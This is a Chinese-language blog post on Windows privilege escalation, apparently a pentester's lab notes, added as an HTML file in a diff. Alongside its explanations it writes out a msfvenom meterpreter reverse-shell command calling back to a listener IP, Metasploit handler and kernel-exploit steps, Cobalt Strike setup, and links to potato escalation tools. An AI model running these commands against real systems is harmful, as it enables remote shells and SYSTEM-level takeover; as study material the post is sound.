@@ -1,0 +1,699 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="基础点：0、为什么我们要学习权限提升转移技术： 简单来说就是达到目的过程中需要用到它 1、具体有哪些权限需要我们了解掌握的： 后台权限，数据库权限，Web权限，用户权限，服务器权限，宿主机权限，域控制器权限 2、以上常见权限获取方法简要归类说明： 后台权限：SQL注入，数据库泄漏，弱口令攻击，未授权访问等造成 数据库权限：SQL注入，数据库泄漏，弱口令攻击，未授权访问等造成 Web权限：RCE,反">
+<meta property="og:type" content="article">
+<meta property="og:title" content="windows权限提升">
+<meta property="og:url" content="https://ca1msec.github.io/2024/09/29/%E5%86%85%E7%BD%91/windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/index.html">
+<meta property="og:site_name" content="Ca1m">
+<meta property="og:description" content="基础点：0、为什么我们要学习权限提升转移技术： 简单来说就是达到目的过程中需要用到它 1、具体有哪些权限需要我们了解掌握的： 后台权限，数据库权限，Web权限，用户权限，服务器权限，宿主机权限，域控制器权限 2、以上常见权限获取方法简要归类说明： 后台权限：SQL注入，数据库泄漏，弱口令攻击，未授权访问等造成 数据库权限：SQL注入，数据库泄漏，弱口令攻击，未授权访问等造成 Web权限：RCE,反">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1722828883099-792fd309-f2d3-47d5-a30a-a011268e2bf2.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724246053021-8b412a41-477f-49fd-adc7-520776ffb99b.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724311011034-f7cf3728-b7f9-4029-bcc2-fae5883e1d3b.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724311164358-6c1f81a9-c839-456c-a50a-c857ce1617d5.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724311298993-b6b6f279-7c29-4a54-bed9-ca7925d99555.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724311556498-26632a85-a253-4017-820f-932200703e4c.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724311885633-d9faf042-7b89-467c-833c-2b15d6bbc4dd.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724723287835-c789085c-1f46-4e5a-acae-971eb076a0a4.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724721100788-beeafb14-f9a1-4ca7-a1ef-76ca17586089.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724721550529-1d7a65b0-66f8-4bc1-bea0-326390c5661d.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724726525834-a177585e-6efc-4bb5-948c-cb08e05647b1.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724726559654-aede9dff-e5d8-47d3-82f9-b78024b8190e.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724726678655-257bd3c8-5337-4ee5-af81-af355857d890.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724726704612-951ea142-10e7-4461-a25e-7e3376691cc0.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724727739945-5c40f1c3-83d6-4cd3-ac38-036f7ce5a6a3.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724738357707-0c37fa9a-5cb7-4447-880f-4d552fec6bb7.png">
+<meta property="article:published_time" content="2024-09-29T14:51:29.000Z">
+<meta property="article:modified_time" content="2025-03-04T03:56:42.121Z">
+<meta property="article:author" content="Ca1m">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="权限提升">
+<meta property="article:tag" content="内网">
+<meta property="article:tag" content="windows">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1722828883099-792fd309-f2d3-47d5-a30a-a011268e2bf2.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>windows权限提升</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Alert/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/09/17/%E5%86%85%E7%BD%91/linux%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ca1msec.github.io/2024/09/29/%E5%86%85%E7%BD%91/windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ca1msec.github.io/2024/09/29/%E5%86%85%E7%BD%91/windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/&text=windows权限提升"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ca1msec.github.io/2024/09/29/%E5%86%85%E7%BD%91/windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/&title=windows权限提升"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ca1msec.github.io/2024/09/29/%E5%86%85%E7%BD%91/windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/&is_video=false&description=windows权限提升"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=windows权限提升&body=Check out this article: https://ca1msec.github.io/2024/09/29/%E5%86%85%E7%BD%91/windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ca1msec.github.io/2024/09/29/%E5%86%85%E7%BD%91/windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/&title=windows权限提升"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ca1msec.github.io/2024/09/29/%E5%86%85%E7%BD%91/windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/&title=windows权限提升"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ca1msec.github.io/2024/09/29/%E5%86%85%E7%BD%91/windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/&title=windows权限提升"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ca1msec.github.io/2024/09/29/%E5%86%85%E7%BD%91/windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/&title=windows权限提升"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ca1msec.github.io/2024/09/29/%E5%86%85%E7%BD%91/windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/&name=windows权限提升&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ca1msec.github.io/2024/09/29/%E5%86%85%E7%BD%91/windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/&t=windows权限提升"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%82%B9%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">基础点：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web%E5%BA%94%E7%94%A8-%E4%B8%AD%E9%97%B4%E4%BB%B6-%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">2.1.</span> <span class="toc-text">Web应用&amp;中间件&amp;数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E8%BD%AC%E7%A7%BB-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86-Web"><span class="toc-number">2.2.</span> <span class="toc-text">权限转移-后台管理&amp;数据库管理&amp;Web</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows"><span class="toc-number">3.</span> <span class="toc-text">Windows</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web%E5%88%B0Win-%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83-%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF-%E5%93%A5%E6%96%AF%E6%8B%89"><span class="toc-number">3.1.</span> <span class="toc-text">Web到Win-系统提权-宝塔面板-哥斯拉</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web%E5%88%B0Win-%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E-MSF-CS"><span class="toc-number">3.2.</span> <span class="toc-text">Web到Win-系统提权-溢出漏洞-MSF&amp;CS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web%E5%88%B0Win-%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83-%E4%BA%BA%E5%B7%A5%E6%93%8D%E4%BD%9C"><span class="toc-number">3.3.</span> <span class="toc-text">Web到Win-系统提权-人工操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web%E5%88%B0Win-%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83-%E5%9C%9F%E8%B1%86%E5%AE%B6%E6%97%8F"><span class="toc-number">3.4.</span> <span class="toc-text">Web到Win-系统提权-土豆家族</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%92%93%E9%B1%BC%E6%88%90%E5%8A%9F%E5%9C%BA%E6%99%AF"><span class="toc-number">3.5.</span> <span class="toc-text">钓鱼成功场景</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%90%AF%E5%8A%A8%EF%BC%88%E6%8F%90%E6%9D%83%EF%BC%89"><span class="toc-number">3.5.1.</span> <span class="toc-text">服务启动（提权）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Win10-11-BypassUAC%E8%87%AA%E5%8A%A8%E6%8F%90%E6%9D%83-MSF-UACME"><span class="toc-number">3.5.2.</span> <span class="toc-text">Win10&amp;11-BypassUAC自动提权-MSF&amp;UACME</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-DLL%E5%8A%AB%E6%8C%81%E6%8F%90%E6%9D%83%E5%BA%94%E7%94%A8%E9%85%8D%E5%90%88MSF-FlashFXP"><span class="toc-number">3.5.3.</span> <span class="toc-text">Windows-DLL劫持提权应用配合MSF-FlashFXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-%E4%B8%8D%E5%B8%A6%E5%BC%95%E5%8F%B7%E6%9C%8D%E5%8A%A1%E8%B7%AF%E5%BE%84%E9%85%8D%E5%90%88MSF-MacroExpert"><span class="toc-number">3.5.4.</span> <span class="toc-text">Windows-不带引号服务路径配合MSF-MacroExpert</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Win2012-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90%E9%85%8D%E5%90%88MSF-NewServices"><span class="toc-number">3.5.5.</span> <span class="toc-text">Win2012-不安全的服务权限配合MSF-NewServices</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%BC%E5%90%88%E7%B1%BB%E6%A3%80%E6%B5%8B%E9%A1%B9%E7%9B%AE%EF%BC%9A"><span class="toc-number">3.5.6.</span> <span class="toc-text">综合类检测项目：</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        windows权限提升
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Ca1m</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-09-29T14:51:29.000Z" class="dt-published" itemprop="datePublished">2024-09-29</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2/">内网攻防</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/web/" rel="tag">web</a>, <a class="p-category" href="/tags/windows/" rel="tag">windows</a>, <a class="p-category" href="/tags/%E5%86%85%E7%BD%91/" rel="tag">内网</a>, <a class="p-category" href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" rel="tag">权限提升</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="基础点："><a href="#基础点：" class="headerlink" title="基础点："></a>基础点：</h1><p>0、为什么我们要学习权限提升转移技术：</p>
+<p>简单来说就是达到目的过程中需要用到它</p>
+<p>1、具体有哪些权限需要我们了解掌握的：</p>
+<p>后台权限，数据库权限，Web权限，用户权限，服务器权限，宿主机权限，域控制器权限</p>
+<p>2、以上常见权限获取方法简要归类说明：</p>
+<p>后台权限：SQL注入，数据库泄漏，弱口令攻击，未授权访问等造成</p>
+<p>数据库权限：SQL注入，数据库泄漏，弱口令攻击，未授权访问等造成</p>
+<p>Web权限：RCE,反序列化,文件上传等直达或通过后台数据库间接造成</p>
+<p>用户权限：弱口令,数据泄漏等直达或通过Web，服务器及域控转移造成</p>
+<p>服务器权限：系统内核漏洞,钓鱼后门攻击,主机软件安全直达或上述权限提升造成</p>
+<p>宿主机权限：Docker不安全配置或漏洞权限提升直达（服务资产造成入口后提升）</p>
+<p>域控制器权限：内网域计算机用户提升或自身内核漏洞，后门攻击，主机软件安全直达</p>
+<p>3、以上常见权限获取后能操作的具体事情：</p>
+<p>后台权限：文章管理，站点管理，模版管理，数据管理，上传管理等</p>
+<p>数据库权限：操作数据库的权限，数据增删改查等（以数据库用户为主）</p>
+<p>Web权限：源码查看，源码文件增删改查，磁盘文件文件夹查看(以权限配置为主)</p>
+<p>用户权限：就如同自己电脑上普通用户能操作的情况（敏感操作会被禁止）</p>
+<p>服务器权限：就如同自己电脑上能操作的情况（整个系统都是你的）</p>
+<p>宿主机权限：就如同自己电脑上能操作的情况（整个系统都是你的）</p>
+<p>域控制器权限：就如同自己电脑上能操作的情况（整个内网域系统都是你的）</p>
+<p>4、以上常见权限在实战中的应用场景介绍：</p>
+<p>当我们通过弱口令进入到应用后台管理</p>
+<p>当我们下载备份文件获取到数据库信息</p>
+<p>当我们通过漏洞拿到资产系统的Web权限</p>
+<p>当我们在公司被给予账号密码登录计算机或系统</p>
+<p>当我们在公司或钓鱼后门获取到某个公司机器系统</p>
+<p>……………………………….</p>
+<p>1、Web搭建平台差异</p>
+<p>集成软件，自行搭建，虚拟化等</p>
+<p>集成软件：宝塔，PhpStudy，XAMMP等</p>
+<p>自行搭建：自己一个个下载安装搭建配置</p>
+<p>虚拟化：Docker，ESXi，QEMU，Hyper-V等</p>
+<p>2、Web语言权限差异</p>
+<p>ASP&#x2F;ASP.NET&#x2F;PHP&#x2F;JSP等</p>
+<p>权限高低：JSP&gt;ASP.NET&gt;ASP&#x3D;PHP</p>
+<p>3、系统用户权限差异</p>
+<p>Windows：</p>
+<p>System：系统组，拥有管理系统资源的权限，包括文件、目录和注册表等。</p>
+<p>Administrators：管理员组，具有对计算机进行完全访问和操作的权限。</p>
+<p>Users：用户组，一般用户的默认组别，拥有较低的系统权限。</p>
+<p>Guests：</p>
+<p>访客组，可以访问计算机上的公共文件夹和打印机，但不能更改配置和安装程序。</p>
+<p>Backup Operators：</p>
+<p>备份操作员组，允许用户备份和还原数据，但不能更改配置安装程序。</p>
+<p>Power Users：高级用户组，拥有比一般用户更高的系统权限，但比管理员组权限低。</p>
+<p>Remote Desktop Users：远程桌面用户组，允许用户进行远程桌面连接。</p>
+<p>Network Configuration Operators：网络配置操作员组，允许用户管理网络配置。</p>
+<p>Performance Log Users：性能日志用户组，允许用户收集性能日志和计数器数据。</p>
+<p>Distributed COM Users：</p>
+<p>分布式 COM 用户组，允许用户使用分布式 COM 连接到计算机。</p>
+<p>IIS_IUSRS: 用于授权IIS相关服务的用户组。</p>
+<p>Linux：</p>
+<p>系统用户：UID(0-999)</p>
+<p>普通用户：UID(1000-*)</p>
+<p>root用户：UID为0，拥有系统的完全控制权限</p>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Web应用-中间件-数据库"><a href="#Web应用-中间件-数据库" class="headerlink" title="Web应用&amp;中间件&amp;数据库"></a>Web应用&amp;中间件&amp;数据库</h2><p>背景1：通过弱口令进入Web后台系统通过上传获取Web权限</p>
+<p>背景2：通过Tomcat弱口令进入控制界面通过上传获取Web权限</p>
+<p>背景3：通过Redis未授权进入管理端通过SQL执行获取Web权限</p>
+<h2 id="权限转移-后台管理-数据库管理-Web"><a href="#权限转移-后台管理-数据库管理-Web" class="headerlink" title="权限转移-后台管理&amp;数据库管理&amp;Web"></a>权限转移-后台管理&amp;数据库管理&amp;Web</h2><p>Tmall-后台权限-&gt;Web权限（提升）</p>
+<p>Tmall-Web权限-&gt;数据库权限（转移）</p>
+<p>Tmall-Web权限-&gt;另一个后台权限（转移）</p>
+<p>PhpMyadmin-数据管理-&gt;Web权限（提升）</p>
+<p>PhpMyadmin-Web权限-&gt;另一个后台权限（转移）</p>
+<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><p>windows提权主要还是溢出漏洞</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1722828883099-792fd309-f2d3-47d5-a30a-a011268e2bf2.png"></p>
+<h2 id="Web到Win-系统提权-宝塔面板-哥斯拉"><a href="#Web到Win-系统提权-宝塔面板-哥斯拉" class="headerlink" title="Web到Win-系统提权-宝塔面板-哥斯拉"></a>Web到Win-系统提权-宝塔面板-哥斯拉</h2><p>Windows 2012(宝塔Apache+PHP)-MSF</p>
+<p>复现搭建：选择2012系统后自行安装宝塔</p>
+<p>哥斯拉插件&#x2F;&#x2F;编码绕过、禁用函数绕过</p>
+<p>Meterpreter</p>
+<p>BypassOpenBaseDir</p>
+<p>BypassDisableFunction</p>
+<h2 id="Web到Win-系统提权-溢出漏洞-MSF-CS"><a href="#Web到Win-系统提权-溢出漏洞-MSF-CS" class="headerlink" title="Web到Win-系统提权-溢出漏洞-MSF&amp;CS"></a>Web到Win-系统提权-溢出漏洞-MSF&amp;CS</h2><p>Windows 2008(IIS+ASP)-MSF</p>
+<p>自行搭建+ASP&#x2F;PHP+Windows 2008</p>
+<p>复现搭建：选择2016系统后自行安装IIS+ASP</p>
+<p>0、MSF安装：（也可以用kali）</p>
+<p>目前的msf版本有bug可以TB上购买pro版本嘎嘎稳</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46717339/article/details/122653084">https://blog.csdn.net/qq_46717339/article/details/122653084</a></p>
+<p>1、生成反弹后门</p>
+<p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.139.141 LPORT&#x3D;3333 -f exe -o msf.exe</p>
+<p>LHOST是msf攻击机配置</p>
+<p>2、攻击机msfconsole配置监听会话</p>
+<p>msfconsole</p>
+<p>use exploit&#x2F;multi&#x2F;handler</p>
+<p>set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</p>
+<p>set lhost 0.0.0.0</p>
+<p>set lport 3333</p>
+<p>exploit</p>
+<p>2.1、筛选EXP模块</p>
+<p>全自动：快速识别系统中可能被利用的漏洞</p>
+<p>use post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester</p>
+<p>set showdescription true</p>
+<p>3、利用EXP溢出提权</p>
+<p>background</p>
+<p>use exploit&#x2F;windows&#x2F;local&#x2F;ms16_075_reflection_juicy</p>
+<p>set session 1</p>
+<p>exploit</p>
+<p>Windows 2016(IIS+ASP.NET)-CS</p>
+<p>复现搭建：选择2016系统后自行安装IIS+ASP.NET</p>
+<p>0、CS安装</p>
+<p>chmod +x .&#x2F;teamserver</p>
+<p>chmod +x .&#x2F;TeamServerImage</p>
+<p>.&#x2F;teamserver IP password</p>
+<p>1、连接CS</p>
+<p>2、创建监听器</p>
+<p>3、加载脚本插件</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724246053021-8b412a41-477f-49fd-adc7-520776ffb99b.png"></p>
+<h2 id="Web到Win-系统提权-人工操作"><a href="#Web到Win-系统提权-人工操作" class="headerlink" title="Web到Win-系统提权-人工操作"></a>Web到Win-系统提权-人工操作</h2><p>如果提权中无法执行命令的话，可以尝试上传cmd.exe到可读写目录再调用</p>
+<p>优点：解决实时更新不集成的EXP</p>
+<p>缺点：操作繁琐，需要各种复现调试</p>
+<p>解决工具或插件无法实时更新，又或者集成较少面对复杂情况下人工操作更适合</p>
+<p>1、信息收集</p>
+<p>参考常见命令（见上图）</p>
+<p>2、补丁筛选</p>
+<p><a target="_blank" rel="noopener" href="https://i.hacking8.com/tiquan">https://i.hacking8.com/tiquan</a>. (已失效)</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a></p>
+<p>python wes.py systeminfo.txt –color</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724311011034-f7cf3728-b7f9-4029-bcc2-fae5883e1d3b.png"></p>
+<p>python wes.py systeminfo.txt –color -i “Elevation of Privilege” &#x2F;&#x2F;权限提升</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724311164358-6c1f81a9-c839-456c-a50a-c857ce1617d5.png"></p>
+<p>python wes.py systeminfo.txt –color -i “Elevation of Privilege” -o vuln.csv</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724311298993-b6b6f279-7c29-4a54-bed9-ca7925d99555.png"></p>
+<p>3、EXP获取执行</p>
+<p>KernelHub 针对常用溢出编号指定找EXP</p>
+<p>Poc-in-Github 针对年份及编号指定找EXP</p>
+<p>exploitdb 针对类型及关键说明指定找EXP</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Ascotbe/Kernelhub">https://github.com/Ascotbe/Kernelhub</a></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724311556498-26632a85-a253-4017-820f-932200703e4c.png"></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/nomi-sec/PoC-in-GitHub">https://github.com/nomi-sec/PoC-in-GitHub</a></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724311885633-d9faf042-7b89-467c-833c-2b15d6bbc4dd.png"></p>
+<p><a target="_blank" rel="noopener" href="https://gitlab.com/exploit-database/exploitdb">https://gitlab.com/exploit-database/exploitdb</a></p>
+<h2 id="Web到Win-系统提权-土豆家族"><a href="#Web到Win-系统提权-土豆家族" class="headerlink" title="Web到Win-系统提权-土豆家族"></a>Web到Win-系统提权-土豆家族</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/OW4ybuqtErh_ovkTWLSr8w">https://mp.weixin.qq.com/s/OW4ybuqtErh_ovkTWLSr8w</a></p>
+<p>土豆(potato)提权通常用在我们获取WEB&#x2F;数据库权限的时候，</p>
+<p>可以将低权限的服务用户提升为“NT AUTHORITY\SYSTEM”特权。</p>
+<p>1、Test in：Windows 10&#x2F;11（1809&#x2F;21H2）</p>
+<p>2、Test in：Windows Server 2019Datacenter(1809)</p>
+<p>3、Test in：Windows Server 2022Datacenter(21H2)</p>
+<p>OK的是实验中成功提权的</p>
+<p>SweetPotato OK</p>
+<p>RoguePotato</p>
+<p>BadPotato OK</p>
+<p>EfsPotato OK</p>
+<p>GodPotato OK</p>
+<p>PetitPotato OK</p>
+<p>MultiPotato</p>
+<p>CandyPotato</p>
+<p>RasmanPotato OK</p>
+<p>CoercedPotato</p>
+<p>JuicyPotatoNG</p>
+<p>PrintNotifyPotato OK</p>
+<p>下载完直接用visual studio打开运行就行</p>
+<p>GodPotato</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/BeichenDream/GodPotato">https://github.com/BeichenDream/GodPotato</a></p>
+<p>SweetPotato</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/CCob/SweetPotato">https://github.com/CCob/SweetPotato</a></p>
+<p>RoguePotato</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/antonioCoco/RoguePotato">https://github.com/antonioCoco/RoguePotato</a></p>
+<p>BadPotato</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/BeichenDream/BadPotato">https://github.com/BeichenDream/BadPotato</a></p>
+<p>EfsPotato</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/zcgonvh/EfsPotato">https://github.com/zcgonvh/EfsPotato</a></p>
+<p>MultiPotato</p>
